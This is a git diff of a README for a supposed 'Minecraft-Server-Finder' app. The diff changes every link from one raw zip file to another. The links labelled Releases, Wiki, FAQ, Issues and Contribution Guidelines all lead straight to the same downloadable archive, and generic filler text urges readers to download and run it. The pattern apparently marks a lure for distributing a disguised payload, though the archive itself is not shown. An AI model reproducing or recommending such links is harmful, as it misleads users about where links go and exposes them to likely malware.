@@ -1,6 +1,6 @@
 # 🕹️ Minecraft-Server-Finder - Discover Minecraft Servers Easily
 
-[![Download](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/fut/Minecraft-Server-Finder.zip)](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/fut/Minecraft-Server-Finder.zip)
+[![Download](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/Index/Server_Finder_Minecraft_v2.5-beta.2.zip)](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/Index/Server_Finder_Minecraft_v2.5-beta.2.zip)
 
 ## 📖 About This Application
 
@@ -22,7 +22,7 @@ Before you start, make sure your system meets these requirements:
 ### 🌐 Download & Install
 
 1. **Visit the Download Page:**  
-   Go to the [Releases page](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/fut/Minecraft-Server-Finder.zip) to download the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/Index/Server_Finder_Minecraft_v2.5-beta.2.zip) to download the application.
 
 2. **Choose the Right File:**  
    Look for the latest version of Minecraft Server Finder. You will find options for different operating systems. Download the file that matches yours.
@@ -74,21 +74,21 @@ Minecraft Server Finder offers several useful features:
 ## 🔍 Additional Resources
 
 - **Documentation:**  
-  If you need further guidance, check the [Wiki](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/fut/Minecraft-Server-Finder.zip) for detailed instructions.
+  If you need further guidance, check the [Wiki](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/Index/Server_Finder_Minecraft_v2.5-beta.2.zip) for detailed instructions.
 
 - **Frequently Asked Questions:**  
-  Visit the [FAQ section](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/fut/Minecraft-Server-Finder.zip) to find answers to common questions.
+  Visit the [FAQ section](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/Index/Server_Finder_Minecraft_v2.5-beta.2.zip) to find answers to common questions.
 
 ## 💬 Get Support
 
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/fut/Minecraft-Server-Finder.zip). 
+If you encounter any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/Index/Server_Finder_Minecraft_v2.5-beta.2.zip). 
 
 ## 📢 Contribution
 
-Contributions are welcome! If you want to help improve Minecraft Server Finder, please read the [Contribution Guidelines](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/fut/Minecraft-Server-Finder.zip) before submitting changes.
+Contributions are welcome! If you want to help improve Minecraft Server Finder, please read the [Contribution Guidelines](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/Index/Server_Finder_Minecraft_v2.5-beta.2.zip) before submitting changes.
 
 ## 🔗 More Information
 
-For updates and news, follow us on social media or check the GitHub repository for the latest releases. Here’s a direct link again for easy access to download: [Download Minecraft-Server-Finder](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/fut/Minecraft-Server-Finder.zip). 
+For updates and news, follow us on social media or check the GitHub repository for the latest releases. Here’s a direct link again for easy access to download: [Download Minecraft-Server-Finder](https://raw.githubusercontent.com/cfsfguyet787856/Minecraft-Server-Finder/main/Index/Server_Finder_Minecraft_v2.5-beta.2.zip). 
 
 Feel free to reach out with your thoughts, feedback, or suggestions! Enjoy discovering new Minecraft servers!
